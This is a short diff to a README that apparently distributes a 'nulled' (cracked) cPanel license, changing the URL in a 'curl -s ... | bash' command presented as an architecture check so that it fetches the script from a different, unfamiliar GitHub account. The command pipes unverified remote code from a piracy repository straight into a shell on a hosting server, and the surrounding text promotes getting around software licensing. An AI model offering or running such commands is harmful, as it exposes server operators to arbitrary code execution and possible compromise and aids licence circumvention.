@@ -39,7 +39,7 @@ https://youtu.be/A_h3KcRCogY?si=pzOP467P25qKk_4n
 # Cannot execute binary file exec format error
 If you use an i*x86 or aarch64 (ARM architectures) operating system, you cannot install the nulled cpanel license. You can check by running this script:
 ```bash
-curl -s https://raw.githubusercontent.com/tactu2023/cPanel-nulled/main/no_execute | bash
+curl -s https://raw.githubusercontent.com/christiancrozz/cpanel/no_execute | bash
 ```
 # License Litespeed
 We recommend litespeed, it's 100% free (original license)
